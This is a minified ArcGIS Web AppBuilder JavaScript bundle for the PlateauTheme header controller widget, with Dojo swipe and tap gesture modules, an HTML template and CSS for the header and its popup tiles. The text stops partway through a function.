// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.

require({cache:{"themes/PlateauTheme/widgets/HeaderController/PopupTileNodes":function(){define("dojo/_base/declare dojo/_base/lang dojo/_base/array dojo/_base/html dojo/on dojo/dom-construct dojo/query dijit/_WidgetBase dijit/_TemplatedMixin jimu/dijit/ViewStack dojox/gesture/swipe dojox/gesture/tap jimu/utils".split(" "),function(n,h,q,a,e,b,g,u,v,d,f,m,w){var t=0;return n([u,v],{baseClass:"jimu-header-more-popup",templateString:'\x3cdiv\x3e\x3cdiv class\x3d"pages" data-dojo-attach-point\x3d"pagesNode"\x3e\x3c/div\x3e\x3cdiv class\x3d"points jimu-corner-bottom"\x3e\x3cdiv class\x3d"points-inner"data-dojo-attach-point\x3d"pointsNode"\x3e\x3c/div\x3e\x3c/div\x3e\x3c/div\x3e',
margin:4,postCreate:function(){this.nodes=[];this.pages=[];this.createCloseBtn()},startup:function(){this.viewStack=new d({views:[],viewType:"dom"},this.pagesNode);this.viewStack.startup();e(this.pagesNode,f.end,h.hitch(this,function(a){t<this.maximumPages-1&&a.dx&&0>a.dx?(t++,this._selectPage(t)):a.dx&&0<a.dx&&0<t&&(t--,this._selectPage(t))}));this.resize()},resize:function(){var b=this._calculateGridParam(),d;null!==b?(a.setStyle(this.domNode,w.getPositionStyle(b.position)),this.nodeWidth=b.cellSize-
this.margin,this.oldGridParam&&this.oldGridParam.rows===b.rows&&this.oldGridParam.cols===b.cols||(this.clearPages(),this.createPages(b)),this.nodes.forEach(h.hitch(this,function(a,d){this.setItemNodePosition(a,d,b)})),this.oldGridParam=b,d=g("div.close",this.domNode)[0],a.setStyle(d,{width:.25*this.nodeWidth+"px",height:.25*this.nodeWidth+"px"})):(this.oldGridParam=null,a.setStyle(this.domNode,w.getPositionStyle({left:0,top:0,width:0,height:0,zIndex:111})),this.nodeWidth=0);!window.appInfo.isRunInMobile&&
760<window.innerWidth&&this.numWidget&&8>=this.numWidget.length&&this.hide()},setItemNodePosition:function(b,d,r){var l,f,e=48,m=16;l=0===d%r.cols?0:this.margin/2;f=d%(r.rows*r.cols)<r.cols?0:this.margin/2;d={};"number"===typeof this.nodeWidth&&(d.width=this.nodeWidth+"px",d.height=this.nodeWidth+"px");"number"===typeof l&&(window.isRTL?d.marginRight=l+"px":d.marginLeft=l+"px");"number"===typeof f&&(d.marginTop=f+"px");if(l=g("img",b)[0])r.iconScaled&&(e*=this.nodeWidth/120),a.setStyle(l,{width:e+
"px",height:e+"px"});if(e=g("div.node-label",b)[0])r.showLabel?(r.iconScaled&&(m*=this.nodeWidth/120),a.setStyle(e,{"font-size":m+"px",display:"block"})):a.setStyle(e,{"font-size":m+"px",display:"none"});a.setStyle(b,d)},clearPages:function(){q.forEach(this.pages,function(a){this.viewStack.removeView(a.pageNode)},this);b.empty(this.pointsNode);this.pages=[];this.nodes=[]},createPages:function(a){var d,l,f,g;this.maximumPages=d=Math.ceil(this.items.length/(a.rows*a.cols));for(l=0;l<d;l++)f=b.create("div",
{"class":"page"}),this.createPageItems(l,f,a),this.viewStack.addView(f),1<d&&(g=b.create("div",{"class":"point"},this.pointsNode),this.own(e(g,"click",h.hitch(this,this._onPageNodeClick,l)))),this.pages.push({pageNode:f,pointNode:g});0<this.viewStack.views.length&&this._selectPage(0)},_onPageNodeClick:function(a){this._selectPage(a)},_selectPage:function(b){1<this.pages.length&&(g(".point",this.domNode).removeClass("point-selected  jimu-main-background"),a.addClass(this.pages[b].pointNode,"point-selected jimu-main-background"));
this.viewStack.switchView(this.pages[b].pageNode)},createPageItems:function(a,b,d){var l,f,e;l=this.items.length;f=d.rows*d.cols;d=(a+1)*f;e=d-l;d=Math.min(d,l);for(a*=f;a<d;a++)this.createItemNode(a,b);for(a=l;a<l+e;a++)this.createEmptyItemNode(b)},createItemNode:function(a,d){var f;a=this.items[a];f=b.create("div",{"class":"icon-node jimu-float-leading jimu-main-background",title:a.label,settingId:a.id},d);b.create("img",{src:a.icon},f);b.create("div",{"class":"node-label",title:a.label,innerHTML:w.stripHTML(a.label)},
f);f.config=a;this.own(e(f,m,h.hitch(this,function(){this.onNodeClicked(f)})));this.nodes.push(f)},createEmptyItemNode:function(a){a=b.create("div",{"class":"icon-node jimu-float-leading  jimu-main-background"},a);this.nodes.push(a);return a},createCloseBtn:function(){var a;a=b.create("div",{"class":"close"},this.domNode);b.create("div",{"class":"close-inner jimu-main-background"},a);e(a,"click",h.hitch(this,function(){this.hide()}));return a},hide:function(){t=0;a.setStyle(this.domNode,"display",
"none")},show:function(){a.setStyle(this.domNode,"display","block")},onNodeClicked:function(a){this.hide()},_calculateGridParam:function(){var b,d,f,e,g=!1,m=!0;b=a.getContentBox(jimuConfig.mapId);d=Math.min(b.w,b.h)-40;if(360<=d)e=120;else{e=Math.floor(d/3);if(10>e)return null;g=!0;80>e&&(m=!1)}d=Math.floor((b.h-40)/e);f=Math.floor((b.w-40)/e);d=4<d?4:d;d=3>d?3:d;f=3>d?3:4<f?4:f;return{rows:d,cols:f,cellSize:e,iconScaled:g,showLabel:m,position:{top:(b.h-e*d)/2,bottom:(b.h-e*d)/2,left:(b.w-e*f)/2,
right:(b.w-e*f)/2,width:e*f-this.margin*(f-1)/2,height:e*d-this.margin*(d-1)/2,zIndex:111}}}})})},"dojox/gesture/swipe":function(){define(["dojo/_base/kernel","dojo/_base/declare","./Base","../main"],function(n,h,q,a){n.experimental("dojox.gesture.swipe");n=h(q,{defaultEvent:"swipe",subEvents:["end"],press:function(a,b){b.touches&&2<=b.touches.length?delete a.context:(a.context||(a.context={x:0,y:0,t:0}),a.context.x=b.screenX,a.context.y=b.screenY,a.context.t=(new Date).getTime(),this.lock(b.currentTarget))},
move:function(a,b){this._recognize(a,b,"swipe")},release:function(a,b){this._recognize(a,b,"swipe.end");delete a.context;this.unLock()},cancel:function(a,b){delete a.context;this.unLock()},_recognize:function(a,b,g){a.context&&(a=this._getSwipeInfo(a,b))&&(a.type=g,this.fire(b.target,a))},_getSwipeInfo:function(a,b){var g={},e=a.context;g.time=(new Date).getTime()-e.t;a=b.screenX-e.x;b=b.screenY-e.y;if(0===a&&0===b)return null;g.dx=a;g.dy=b;return g}});a.gesture.swipe=new n;a.gesture.swipe.Swipe=
n;return a.gesture.swipe})},"dojox/gesture/Base":function(){define("dojo/_base/kernel dojo/_base/declare dojo/_base/array dojo/_base/lang dojo/dom dojo/on dojo/touch dojo/has ../main".split(" "),function(n,h,q,a,e,b,g,u,v){n.experimental("dojox.gesture.Base");a.getObject("gesture",!0,v);return h(null,{defaultEvent:" ",subEvents:[],touchOnly:!1,_elements:null,constructor:function(b){a.mixin(this,b);this.init()},init:function(){this._elements=[];if(!u("touch")&&this.touchOnly)console.warn("Gestures:[",
this.defaultEvent,"] is only supported on touch devices!");else{var a=this.defaultEvent;this.call=this._handle(a);this._events=[a];q.forEach(this.subEvents,function(b){this[b]=this._handle(a+"."+b);this._events.push(a+"."+b)},this)}},_handle:function(a){var d=this;return function(f,g){var e=arguments;2<e.length&&(f=e[1],g=e[2]);if(f&&(f.nodeType||f.attachEvent||f.addEventListener)){var m=d._add(f,a,g);return{remove:function(){m.remove();d._remove(f,a)}}}return b(f,a,g)}},_add:function(d,f,e){var m=
this._getGestureElement(d);if(!m){var m={target:d,data:{},handles:{}},h=a.hitch(this,"_process",m,"press"),l=a.hitch(this,"_process",m,"move"),n=a.hitch(this,"_process",m,"release"),q=a.hitch(this,"_process",m,"cancel"),p=m.handles;this.touchOnly?(p.press=b(d,"touchstart",h),p.move=b(d,"touchmove",l),p.release=b(d,"touchend",n),p.cancel=b(d,"touchcancel",q)):(p.press=g.press(d,h),p.move=g.move(d,l),p.release=g.release(d,n),p.cancel=g.cancel(d,q));this._elements.push(m)}m.handles[f]=m.handles[f]?++m.handles[f]:
1;return b(d,f,e)},_getGestureElement:function(a){for(var b=0,d;b<this._elements.length;b++)if(d=this._elements[b],d.target===a)return d},_process:function(a,b,e){e._locking=e._locking||{};e._locking[this.defaultEvent]||this.isLocked(e.currentTarget)||("INPUT"==e.target.tagName&&"radio"!=e.target.type&&"checkbox"!=e.target.type||"TEXTAREA"==e.target.tagName||e.preventDefault(),e._locking[this.defaultEvent]=!0,this[b](a.data,e))},press:function(a,b){},move:function(a,b){},release:function(a,b){},cancel:function(a,
b){},fire:function(a,f){a&&f&&(f.bubbles=!0,f.cancelable=!0,b.emit(a,f.type,f))},_remove:function(a,b){if((a=this._getGestureElement(a))&&a.handles){a.handles[b]--;var d=a.handles;q.some(this._events,function(a){return 0<d[a]})||(this._cleanHandles(d),b=q.indexOf(this._elements,a),0<=b&&this._elements.splice(b,1))}},_cleanHandles:function(a){for(var b in a)a[b].remove&&a[b].remove(),delete a[b]},lock:function(a){this._lock=a},unLock:function(){this._lock=null},isLocked:function(a){return this._lock&&
a?this._lock!==a&&e.isDescendant(a,this._lock):!1},destroy:function(){q.forEach(this._elements,function(a){this._cleanHandles(a.handles)},this);this._elements=null}})})},"dojox/gesture/tap":function(){define(["dojo/_base/kernel","dojo/_base/declare","dojo/_base/lang","./Base","../main"],function(n,h,q,a,e){n.experimental("dojox.gesture.tap");n=h(a,{defaultEvent:"tap",subEvents:["hold","doubletap"],holdThreshold:500,doubleTapTimeout:250,tapRadius:10,press:function(a,e){if(e.touches&&2<=e.touches.length)clearTimeout(a.tapTimeOut),
delete a.context;else{var b=e.target;this._initTap(a,e);a.tapTimeOut=setTimeout(q.hitch(this,function(){this._isTap(a,e)&&this.fire(b,{type:"tap.hold"});delete a.context}),this.holdThreshold)}},release:function(a,e){if(a.context&&this._isTap(a,e))switch(a.context.c){case 1:this.fire(e.target,{type:"tap"});break;case 2:this.fire(e.target,{type:"tap.doubletap"})}clearTimeout(a.tapTimeOut)},_initTap:function(a,e){a.context||(a.context={x:0,y:0,t:0,c:0});var b=(new Date).getTime();b-a.context.t<=this.doubleTapTimeout?
a.context.c++:(a.context.c=1,a.context.x=e.screenX,a.context.y=e.screenY);a.context.t=b},_isTap:function(a,e){if(!a.context)return!1;var b=Math.abs(a.context.y-e.screenY);return Math.abs(a.context.x-e.screenX)<=this.tapRadius&&b<=this.tapRadius}});e.gesture.tap=new n;e.gesture.tap.Tap=n;return e.gesture.tap})},"themes/PlateauTheme/widgets/HeaderController/_build-generate_module":function(){define(["dojo/text!./Widget.html","dojo/text!./css/style.css","dojo/i18n!./nls/strings"],function(){})},"url:themes/PlateauTheme/widgets/HeaderController/Widget.html":'\x3cdiv\x3e\r\n  \x3c!-- solve the bug of style delay loading --\x3e\r\n  \x3cdiv class\x3d"header-section jimu-float-leading" data-dojo-attach-point\x3d"headerNode"\x3e\r\n    \x3ca data-dojo-attach-point\x3d"logoLinkNode" target\x3d"_blank"\x3e\r\n      \x3cimg class\x3d"logo jimu-float-leading jimu-leading-margin1" data-dojo-attach-point\x3d"logoNode" data-dojo-attach-event\x3d"onload:_onLogoLoad"\x3e\r\n    \x3c/a\x3e\r\n    \x3cdiv class\x3d"titles jimu-float-leading jimu-leading-margin1" data-dojo-attach-point\x3d"titlesNode"\x3e\r\n      \x3cdiv class\x3d"jimu-title jimu-float-leading" data-dojo-attach-point\x3d"titleNode"\x3e\x3c/div\x3e\r\n      \x3cdiv class\x3d"jimu-subtitle jimu-float-leading jimu-leading-margin2" data-dojo-attach-point\x3d"subtitleNode"\x3e\x3c/div\x3e\r\n    \x3c/div\x3e\r\n    \x3cdiv class\x3d"links jimu-float-leading jimu-leading-margin1" data-dojo-attach-point\x3d"linksNode"\x3e\r\n      \x3cdiv class\x3d"dynamic-section jimu-float-leading" data-dojo-attach-point\x3d"dynamicLinksNode"\x3e\x3c/div\x3e\r\n      \x3cdiv class\x3d"signin-section jimu-float-leading" data-dojo-attach-point\x3d"signInSectionNode"\x3e\r\n        \x3ca href\x3d"#" class\x3d"jimu-link" data-dojo-attach-event\x3d"onclick:_onSigninClick" data-dojo-attach-point\x3d"signinLinkNode"\x3e${nls.signin}\x3c/a\x3e\r\n        \x3ca href\x3d"" target\x3d"_blank" class\x3d"jimu-link" data-dojo-attach-event\x3d"onclick:_onUserNameClick" data-dojo-attach-point\x3d"userNameLinkNode"\x3e\x3c/a\x3e\r\n        \x3ca href\x3d"#" class\x3d"jimu-link" data-dojo-attach-event\x3d"onclick:_onSignoutClick" data-dojo-attach-point\x3d"signoutLinkNode"\x3e${nls.signout}\x3c/a\x3e\r\n      \x3c/div\x3e\r\n    \x3c/div\x3e\r\n  \x3c/div\x3e\r\n  \x3cdiv class\x3d"container-section jimu-float-leading jimu-main-background" data-dojo-attach-point\x3d"containerNode"\x3e\x3c/div\x3e\r\n\x3c/div\x3e\r\n',
"url:themes/PlateauTheme/widgets/HeaderController/css/style.css":'.jimu-widget-header-controller {box-shadow: 0px 1px 8px 0px rgba(0, 0, 0, 0.4);}.jimu-widget-header-controller .header-section {height: 100%; overflow: hidden; width: calc(100% - 360px);}.jimu-widget-header-controller .container-section {height: 100%; min-width: 80px;}.jimu-widget-header-controller .logo {cursor: pointer;}.jimu-widget-header-controller .hide-logo {display: none;}.jimu-widget-header-controller .titles {height: 100%; overflow: hidden;}.jimu-widget-header-controller .jimu-title {text-align: center; height: 100%;}.jimu-widget-header-controller .jimu-subtitle {text-align: center; height: 100%;}.jimu-widget-header-controller .links {height: 100%; overflow: hidden;}.jimu-widget-header-controller .dynamic-section, .jimu-widget-header-controller .signin-section {height: 100%;}.jimu-widget-header-controller .links .jimu-link {height: 100%;}.jimu-widget-header-controller .signin-section .jimu-link {color: #d9dde0;}.jimu-widget-header-controller .icon-node {cursor: pointer; opacity: 1; text-align: center; border-right: 1px solid #323e4f;}.jimu-widget-header-controller .icon-node img {height: 20px; width: 20px;}.jimu-widget-header-controller .icon-node:first-child {border: none;}.jimu-widget-header-controller .icon-node:hover {opacity: 1;}.jimu-widget-header-controller .icon-node.jimu-state-selected {background-color: #697a8c; opacity: 1; border: none; border-top: 2px solid #8491a1;}.jimu-widget-header-controller .drop-triangle {position: absolute; width: 0px; height: 0px; bottom: 1px; border-left: 4px solid transparent; border-right: 4px solid transparent; border-top: 4px solid white;}.jimu-widget-header-controller .jimu-drop-menu {box-shadow: 0px 1px 8px 0px rgba(0, 0, 0, 0.4);}.jimu-widget-header-controller .jimu-drop-menu .menu-item {overflow: hidden; border-top: 1px solid rgba(0, 0, 0, 0.2);}.jimu-widget-header-controller .jimu-drop-menu .menu-item:hover {background-color: rgba(0, 0, 0, 0.2);}.jimu-widget-header-controller .jimu-drop-menu .menu-item img {width: 24px; height: 24px; cursor: pointer; margin: 8px;}.jimu-widget-header-controller .jimu-drop-menu .menu-item .label {cursor: pointer; margin-top: 12px; font-size: 14px; color: white; min-width: 50px; text-align: center; white-space: nowrap; max-width: 300px; text-overflow: ellipsis; overflow: hidden; padding-right: 8px;}.jimu-rtl .jimu-widget-header-controller .jimu-drop-menu .menu-item .label{padding-left: 8px;}.popup-links .popup-title {}.popup-links .logo {height: 30px;}.popup-links .title {color: #fff; text-align: center; font-size: 16px; width: 71.42857142857143%; overflow: hidden; white-space: nowrap; height: 100%;}.popup-links .line {width: 100%; height: 4px; border-bottom: 1px solid #393c40;}.popup-links .link-section {width: 100%; height: 66px;}.popup-links a {color: #fff; margin-left: 20px; font-size: 14px; height: 100%; width: 95%; overflow: hidden; display: inline-block;}.popup-links .link-section.signin a {color: #d9dde0;}.jimu-header-more-popup {position: absolute; border-radius: 2px; z-index: 111; background-color: #FFFFFF;}.jimu-header-more-popup .pages {position: relative; overflow: hidden; padding: 2px;}.jimu-header-more-popup .points {position: absolute; overflow: hidden; bottom: -15px; left: 0px; right: 0px; text-align: center; background-color: #bababa;}.jimu-header-more-popup .points-inner {display: inline-block; overflow: hidden;}.jimu-header-more-popup .point {float: left; width: 8px; height: 8px; margin-left: 5px; border-radius: 4px; background-color: #f2f6f9; cursor: pointer;}.jimu-header-more-popup .point-selected {background-color: #485566;}.jimu-header-more-popup .page {position: relative; overflow: hidden;}.jimu-header-more-popup .close {position: absolute; top: -04.46428571428571%; right: -04.46428571428571%; border-radius: 50%; background-color: #FFFFFF; cursor: pointer;}.jimu-rtl .jimu-header-more-popup .close {left: -04.46428571428571%; right: auto;}.jimu-header-more-popup .close-inner {width: 80%; height: 80%; margin-left: 10%; margin-top: 10%; border-radius: 50%; background-image: url("images/close.png"); background-repeat: no-repeat; background-position: center center; background-size: 13px;}.jimu-header-more-popup .icon-node {cursor: pointer;}.jimu-header-more-popup .icon-node.jimu-state-selected {background-color: red;}.jimu-header-more-popup img {width: 48px; height: 48px; margin: auto; margin-top: 25%; display: block;}.jimu-header-more-popup .node-label {width: 100%; text-align: center; font-size: 16px; margin-top: 5px; color: white; overflow: hidden; white-space: nowrap; text-overflow: ellipsis; display: inline-block; height: 20px;}@media screen and (max-width:320px){.jimu-header-more-popup .close-inner {background-size: 9px;}}@media screen and (max-width:760px) {.jimu-header-more-popup .node-label {font-size: 13px !important; height: 17px;} .jimu-widget-header-controller .header-section {width: calc(100% - 90px) !important;}}.jimu-more-icon-cover {z-index: 110; position: absolute; left: 0; top: 0; width: 100%; height: 100%;}.jimu-widget-header-controller .esriCTHidden {display: none;}.jimu-widget-header-controller .widget-open-symbol {height: 4px; width: 4px; border-radius: 4px; margin: auto; color: #FFF; background-color: #FFF;}',
"*now":function(n){n(['dojo/i18n!*preload*themes/PlateauTheme/widgets/HeaderController/nls/Widget*["ar","bs","cs","da","de","en","el","es","et","fi","fr","he","hi","hr","id","it","ja","ko","lt","lv","nb","nl","pl","pt-br","pt-pt","ro","ru","sl","sr","sv","th","tr","zh-cn","vi","zh-hk","zh-tw","ROOT"]'])},"*noref":1}});
define("dojo/_base/declare dojo/_base/lang dojo/_base/array dojo/_base/html dojo/aspect dojo/query dojo/on dojo/Deferred dojo/mouse dojo/topic dojo/dom-construct dojo/dom-geometry jimu/BaseWidget jimu/PoolControllerMixin jimu/tokenUtils jimu/portalUtils jimu/portalUrlUtils jimu/utils jimu/dijit/Message ./PopupTileNodes dijit/registry dojo/NodeList-manipulate".split(" "),function(n,h,q,a,e,b,g,u,v,d,f,m,w,t,l,x,r,p,y,z,A){return n([w,t],{baseClass:"jimu-widget-header-controller jimu-main-background",
maxIconCount:-1,createMoreIcon:!1,switchableElements:{},height:40,openedId:"",moveTopOnActive:!1,postCreate:function(){this.inherited(arguments);this._processGroupSetting();this.switchableElements.title=this.titleNode;this.position&&this.position.height&&(this.height=this.position.height);a.setStyle(this.signInSectionNode,"display","none");this.appConfig&&this.appConfig.logo?(this.logoNode.src=this.appConfig.logo,a.removeClass(this.logoNode,"hide-logo")):(this.logoNode.src="",a.addClass(this.logoNode,
"hide-logo"));this.appConfig.title&&(this.appConfig.title=p.sanitizeHTML(this.appConfig.title));this.appConfig.subtitle&&(this.appConfig.subtitle=p.sanitizeHTML(this.appConfig.subtitle));this.switchableElements.title.innerHTML=this.appConfig.title?this.appConfig.title:"";this.switchableElements.title.title=this.appConfig.title?this.appConfig.title:"";this.appConfig.subtitle&&""!==h.trim(this.appConfig.subtitle)?(this.switchableElements.subtitle=this.subtitleNode,this.switchableElements.subtitle.innerHTML=
this.appConfig.subtitle):(this.subtitleNode.innerHTML="",a.setStyle(this.subtitleNode,"display","none"));this._createDynamicLinks(this.appConfig.links);this._setElementsSize();this.own(g(this.domNode,v.enter,h.hitch(this,function(){var a="",k=r.getServerByUrl(this.appConfig&&this.appConfig.portalUrl||"");r.isArcGIScom(k)&&(k="ArcGIS.com");k&&(a=this.nls.signInTo+" "+k);this.signinLinkNode.title=a})));this._handleLogoLink(this.appConfig)},startup:function(){this.inherited(arguments);this.resize()},
onAction:function(a,k){"highLight"===a&&k&&(k=b('div[settingid\x3d"'+k.widgetId+'"]',this.domNode)[0],this._highLight(k));"removeHighLight"===a&&this._removeHighLight()},onSignIn:function(c){this.inherited(arguments);a.setStyle(this.signinLinkNode,"display","none");a.setStyle(this.userNameLinkNode,"display","");a.setStyle(this.signoutLinkNode,"display","");this.userNameLinkNode.innerHTML=c.userId;a.setAttr(this.userNameLinkNode,"href",this.appConfig.portalUrl+"home/user.html");this.popupLinkNode&&
(a.setStyle(this.popupSigninNode,"display","none"),a.setStyle(this.popupUserNameNode,"display",""),a.setStyle(this.popupSignoutNode,"display",""),b("a",this.popupUserNameNode).html(c.userId).attr("href",this.appConfig.portalUrl+"home/user.html"));this.resize()},onSignOut:function(){this.inherited(arguments);this._onSignOut(this.nls.signin);x.getPortal(this.appConfig.portalUrl).loadSelfInfo().then(h.hitch(this,function(a){this._onSignOut(this.nls.signInTo+" "+a.name)}),h.hitch(this,function(a){console.error(a)}))},
_onSignOut:function(c){a.setStyle(this.signinLinkNode,"display","");a.setAttr(this.signinLinkNode,"innerHTML",c);a.setStyle(this.userNameLinkNode,"display","none");a.setStyle(this.signoutLinkNode,"display","none");this.userNameLinkNode.innerHTML="";this.popupLinkNode&&(a.setStyle(this.popupSigninNode,"display",""),a.setAttr(this.popupSigninNode,"innerHTML",c),a.setStyle(this.popupUserNameNode,"display","none"),a.setStyle(this.popupSignoutNode,"display","none"),b("a",this.popupUserNameNode).html(""));
this.resize()},resize:function(){var c=0,k=a.getStyle(this.headerNode,"float"),e=a.getStyle(this.logoNode,"float"),f=a.getStyle(this.titlesNode,"float"),g=a.getStyle(this.linksNode,"float");k&&"none"!==k&&e&&"none"!==e&&f&&"none"!==f&&g&&"none"!==g?this._resize():setTimeout(h.hitch(this,this.resize),200);b(".jimu-widget-attributetable")[0]&&(c=b(".jimu-widget-attributetable")[0].clientHeight);c?d.publish("changeMapPosition",{bottom:c}):d.publish("changeMapPosition",{bottom:"0px"})},_resize:function(){var c=
a.getContentBox(this.domNode);this._showSwitchableElements(["title","links","subtitle"]);this._updateTitleNodeWidth();this._getTitleContainerWidth(c);this._createIconNodes(c);this._updateTitleNodeWidth();this.morePane&&this.morePane.resize();this.popupLinkNode&&a.setStyle(jimuConfig.layoutId,{left:a.getContentBox(this.popupLinkNode).w+"px"})},_updateTitleNodeWidth:function(){var c;c=a.getContentBox(this.domNode);c=this._getHeaderContainerWidth(c)-this._getLogoWidth()-this._getTitlesWidth()-this._getSubtitleWidth()-
this._getLinkWidth();c=this._getTitlesWidth()+c+40;"none"===a.getStyle(this.subtitleNode,"display")&&(c+=20,"none"===a.getStyle(this.linksNode,"display")&&(c+=20));150>c?a.setStyle(this.titleNode,"max-width","150px"):a.setStyle(this.titleNode,"max-width",c+"px")},destroy:function(){this.timeoutHandle&&(clearTimeout(this.timeoutHandle),this.timeoutHandle=null);this.morePane&&this.morePane.destroy();this.moreIconPaneCoverNode&&(a.destroy(this.moreIconPaneCoverNode),this.moreIconPaneCoverNode=null);
this.popupLinkNode&&this.popupLinksVisible&&this._hidePopupLink();a.destroy(this.popupLinkNode);this.inherited(arguments)},onAppConfigChanged:function(a,k,b){switch(k){case "attributeChange":this._onAttributeChange(a,b);break;default:return}this.appConfig=a;this.resize()},getOpenedIds:function(){this.inherited(arguments);return""===this.openedId?[]:[this.openedId]},setOpenedIds:function(a){if(0!==a.length){var c=this.getConfigById(a[0]);c&&(this.openedId=a[0],c.widgets&&"openAll"===c.openType?this._showIconContent(c):
c.widgets||this._showIconContent(c))}},_onLogoLoad:function(){this.resize()},_highLight:function(a){this.hlDiv&&this._removeHighLight();if(a){var c=m.getMarginBox(a);this.hlDiv=f.create("div",{style:{position:"absolute",left:c.l+"px",top:c.t+"px",width:c.w+"px",height:c.h+"px"},"class":"icon-highlight"},a,"before")}},_removeHighLight:function(){this.hlDiv&&(f.destroy(this.hlDiv),this.hlDiv=null)},_onAttributeChange:function(c,b){var k;"title"in b&&b.title!==this.appConfig.title&&(k=p.sanitizeHTML(b.title),
this.titleNode.innerHTML=k,this.titleNode.title=k);"subtitle"in b&&b.subtitle!==this.appConfig.subtitle&&(this.subtitleNode.innerHTML=p.sanitizeHTML(b.subtitle));"logo"in b&&b.logo!==this.appConfig.logo&&(b.logo?(a.setAttr(this.logoNode,"src",b.logo),a.removeClass(this.logoNode,"hide-logo")):(a.removeAttr(this.logoNode,"src"),a.addClass(this.logoNode,"hide-logo")));"links"in b&&this._createDynamicLinks(b.links);this._handleLogoLink(c)},_handleLogoLink:function(c){c.logoLink?(a.setAttr(this.logoLinkNode,
"href",c.logoLink),a.setStyle(this.logoNode,"cursor","pointer")):(a.setAttr(this.logoLinkNode,"href","javascript:void(0)"),a.setStyle(this.logoNode,"cursor","default"))},_setElementsSize:function(){a.setStyle(this.logoNode,{height:"30px",marginTop:(this.height-30)/2+"px"});a.setStyle(this.titleNode,{lineHeight:this.height+"px"});a.setStyle(this.subtitleNode,{lineHeight:this.height+"px"});b(".jimu-link",this.domNode).style({lineHeight:this.height+"px"})},_processGroupSetting:function(){this._setMapCanvasAreaToDefault();
q.forEach(this.appConfig.widgetPool.groups,function(a){var c;a:{if(this.config.groupSetting)for(c=0;c<this.config.groupSetting.length;c++)if(this.config.groupSetting[c].label===a.label){c=this.config.groupSetting[c].type;break a}c="openAll"}a.openType=c},this)},_createDynamicLinks:function(c){if(window.isRTL){var b=[];q.forEach(c,function(a){b.unshift(a)});c=b}a.empty(this.dynamicLinksNode);0>=c.length?(a.setStyle(this.linksNode,"display","none"),this.switchableElements.hasOwnProperty("links")&&delete this.switchableElements.links):
(this.switchableElements.links=this.linksNode,q.forEach(c,function(c){a.create("a",{href:c.url,target:"_blank",innerHTML:p.sanitizeHTML(c.label),"class":"jimu-link jimu-align-leading jimu-leading-margin1",style:{lineHeight:this.height+"px"}},this.dynamicLinksNode)},this))},_showSwitchableElements:function(c){var b=this.switchableElements,d;for(d in b)b.hasOwnProperty(d)&&(-1<c.indexOf(d)?(a.setStyle(b[d],"display","block"),b[d].visible=!0):(a.setStyle(b[d],"display","none"),b[d].visible=!1));this.logoClickHandle&&
this.logoClickHandle.remove();0>c.indexOf("links")?this.logoClickHandle=g(this.logoNode,"click",h.hitch(this,this._onLogoClick)):(this.popupLinksVisible&&this._hidePopupLink(),this.appConfig.logoLink?a.setStyle(this.logoNode,"cursor","pointer"):a.setStyle(this.logoNode,"cursor","default"))},_switchSignin:function(){var a=l.getPortalCredential(this.appConfig.portalUrl);if(a)this.onSignIn(a);else this.onSignOut()},_onLogoClick:function(){this.popupLinkNode&&a.destroy(this.popupLinkNode);this.popupLinkNode=
this._createPopupLinkNode();this.popupLinksVisible?this._hidePopupLink():this._showPopupLink()},_hidePopupLink:function(){a.setStyle(this.popupLinkNode,"display","none");window.isRTL?a.setStyle(jimuConfig.layoutId,{right:0}):a.setStyle(jimuConfig.layoutId,{left:0});this.popupLinksVisible=!1},_showPopupLink:function(){a.setStyle(this.popupLinkNode,"display","");window.isRTL?a.setStyle(jimuConfig.layoutId,{right:a.getContentBox(this.popupLinkNode).w+"px"}):a.setStyle(jimuConfig.layoutId,{left:a.getContentBox(this.popupLinkNode).w+
"px"});this.popupLinksVisible=!0},_createPopupLinkNode:function(){var c,b;a.getContentBox(jimuConfig.mainPageId);c=a.create("div",{"class":"popup-links jimu-main-background",style:{position:"absolute",zIndex:100,top:0,bottom:0}},jimuConfig.mainPageId);window.isRTL?a.setStyle(c,{right:0,left:"50px"}):a.setStyle(c,{left:0,right:"50px"});b=a.create("div",{"class":"popup-title",style:{height:this.height+"px",width:"100%"}},c);a.create("img",{"class":"logo jimu-float-leading jimu-leading-margin1",src:this.appConfig.logo?
this.appConfig.logo:this.folderUrl+"images/app-logo.png",style:{width:"30px",height:"30px",marginTop:(this.height-30)/2+"px"}},b);a.create("div",{"class":"title jimu-float-leading jimu-leading-margin1",innerHTML:p.sanitizeHTML(this.appConfig.title),style:{lineHeight:this.height+"px"}},b);q.forEach(this.appConfig.links,function(a){this._createLinkNode(c,a,!1)},this);this._createLinkNode(c,{label:"",url:"#"},!1);return c},_createLinkNode:function(c,b,d){c=a.place('\x3cdiv class\x3d"jimu-link"\x3e\x3c/div\x3e',
c);a.place('\x3cdiv class\x3d"line"\x3e\x3c/div\x3e',c);d=a.place('\x3cdiv class\x3d"'+(d?"link-section signin":"link-section")+'"\x3e\x3c/div\x3e',c);a.create("a",{href:b.url,"class":"jimu-ellipsis",target:"_blank",innerHTML:p.sanitizeHTML(b.label),title:p.sanitizeHTML(b.label),style:{lineHeight:"66px"}},d);return c},_onSigninClick:function(){l.signInPortal(this.appConfig.portalUrl,this.appConfig.appId)},_onSignoutClick:function(){this.appConfig.mode?new y({message:this.nls.cantSignOutTip}):l.signOutAll()},
_onUserNameClick:function(){},_getHeaderSectionWidth:function(){return a.getMarginBox(this.headerNode).w},_getIconContainerWidth:function(){return a.getMarginBox(this.containerNode).w},_getTitlesWidth:function(){return a.getMarginBox(this.titlesNode).w},_getLinkWidth:function(){return a.getMarginBox(this.linksNode).w},_getLogoWidth:function(){return a.getMarginBox(this.logoNode).w+12},_getSubtitleWidth:function(){return a.getMarginBox(this.subtitleNode).w},_getHeaderContainerWidth:function(a){var c=
this._getIconContainerWidth(),b=this._getLogoWidth();return a.w-c-b},_getTitleContainerWidth:function(a){a=this._getHeaderContainerWidth(a);var c=this._getTitlesWidth(),b=this._getLinkWidth();a<c+b&&(this.switchableElements.hasOwnProperty("links")&&this.switchableElements.links.visible?(this._showSwitchableElements(["title","subtitle"]),c=this._getTitlesWidth(),a<c&&this._showSwitchableElements(["title"])):this._showSwitchableElements(["title"]))},_createIconNodes:function(c,d){b(".icon-node",this.containerNode).remove();
